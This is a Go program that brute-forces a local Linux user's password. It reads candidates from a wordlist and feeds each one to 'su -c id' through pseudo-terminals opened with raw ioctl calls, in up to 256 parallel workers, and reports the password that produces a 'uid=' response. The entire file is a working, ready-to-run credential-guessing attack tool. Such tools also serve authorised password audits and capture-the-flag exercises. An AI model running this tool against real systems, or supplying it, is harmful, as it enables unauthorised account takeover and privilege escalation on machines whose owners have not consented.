package main

import (
	"bufio"
	"context"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

var batchSize = 256
var commandTimeout = 3

func main() {
	log.SetFlags(0)
	if len(os.Args) < 3 {
		log.Fatal("args: username passwordfile [batchsize - defaults 256] [command timeout - defaults 3 (seconds)]")
	}

	username := os.Args[1]
	passwordFile := os.Args[2]

	if len(os.Args) == 4 {
		res, err := strconv.Atoi(os.Args[3])
		if err == nil {
			batchSize = res
		}
	}
	if len(os.Args) == 5 {
		res, err := strconv.Atoi(os.Args[4])
		if err == nil {
			commandTimeout = res
		}
	}

	tasks := make(chan string, batchSize)
	var wg sync.WaitGroup

	for i := 0; i < batchSize; i++ {
		wg.Add(1)
		go func() {
			pty, tty, err := open()
			if err != nil {
				log.Fatal(err)
			}
			defer tty.Close()
			defer pty.Close()

			for candidate := range tasks {
				testCandidate(username, candidate, pty, tty)
			}
			wg.Done()
		}()
	}

	log.Println("starting...")
	processPasswords(passwordFile, tasks)

	close(tasks)
	wg.Wait()
}

func processPasswords(passwordFile string, tasks chan string) {
	file, err := os.Open(passwordFile)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	count := 0

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		tasks <- scanner.Text()
		count++
		if count%1000 == 0 {
			log.Printf("%d candidates tested\n", count)
		}
	}
}

func testCandidate(username, candidate string, pty, tty *os.File) {
	ctx, cancelFn := context.WithTimeout(context.Background(), time.Duration(commandTimeout)*time.Second)
	defer cancelFn()

	c := exec.CommandContext(ctx, "su", "-c", "id", username)
	defer c.Wait()

	c.Stdout = tty
	c.Stderr = tty
	c.Stdin = tty

	if err := c.Start(); err != nil {
		log.Fatal(err)
	}

	buffer := make([]byte, 100)

	n, _ := pty.Read(buffer)
	for {
		result := string(buffer[:n])
		if strings.Contains(result, "Password:") {
			break
		} else if strings.Trim(result, "\r\n") != "" {
			log.Fatal("unexpected response: " + result)
		}
		n, _ = pty.Read(buffer)
	}

	pty.Write([]byte(candidate + "\n"))

	n, _ = pty.Read(buffer)
	for {
		result := string(buffer[:n])
		if strings.Contains(result, "Authentication failure") {
			break
		} else if strings.Contains(result, "uid=") {
			log.Printf("success with %s\n", candidate)
			os.Exit(0)
		} else if strings.Trim(result, "\r\n") != "" {
			log.Fatal("unexpected response: " + result)
		}
		n, _ = pty.Read(buffer)
	}
}

func open() (pty, tty *os.File, err error) {
	p, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
	if err != nil {
		return nil, nil, err
	}
	// In case of error after this point, make sure we close the ptmx fd.
	defer func() {
		if err != nil {
			_ = p.Close() // Best effort.
		}
	}()

	sname, err := ptsname(p)
	if err != nil {
		return nil, nil, err
	}

	if err := unlockpt(p); err != nil {
		return nil, nil, err
	}

	t, err := os.OpenFile(sname, os.O_RDWR|unix.O_NOCTTY, 0)
	if err != nil {
		return nil, nil, err
	}
	return p, t, nil
}

func ptsname(f *os.File) (string, error) {
	var n uint
	err := ioctl(f.Fd(), unix.TIOCGPTN, uintptr(unsafe.Pointer(&n)))
	if err != nil {
		return "", err
	}
	return "/dev/pts/" + strconv.Itoa(int(n)), nil
}

func unlockpt(f *os.File) error {
	var u uint
	// use TIOCSPTLCK with a pointer to zero to clear the lock
	return ioctl(f.Fd(), unix.TIOCSPTLCK, uintptr(unsafe.Pointer(&u)))
}

func ioctl(fd, cmd, ptr uintptr) error {
	_, _, e := unix.Syscall(unix.SYS_IOCTL, fd, cmd, ptr)
	if e != 0 {
		return e
	}
	return nil
}
